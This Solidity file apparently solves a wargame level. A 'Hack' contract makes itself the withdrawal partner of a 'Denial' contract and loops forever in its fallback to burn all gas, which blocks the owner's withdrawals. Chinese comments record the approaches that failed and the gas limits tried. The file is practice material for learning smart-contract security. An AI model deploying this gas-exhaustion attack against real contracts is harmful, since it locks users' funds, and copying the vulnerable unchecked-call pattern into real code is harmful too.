// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//合作伙伴call失败并不影响owner的提现，代码会继续执行，所以需要一个合约作为partner
//在partner.call失败时回滚，但是靠revert无法做到，要通过将gas耗尽
//耗尽gas：solidity 0.8.0版本之前通过assert（false），0.8.0之后通过内联，也可以通过无限循环
contract Hack {
    constructor(Denial denial) {
        denial.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        //不能用receive，不然交易仍会执行,不过fallback似乎也会执行
        // revert("deny call"); 无效
        // assembly {
        //     invalid()
        // }
        //最后还是使用的循环，然后交易时最好将gas限制在2000000，在foundry中分叉测试
        //2000000会超出gas范围，而3000000可以正常通过测试（在remix测试网中也是这样）
        while (true) {}
    }
}

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
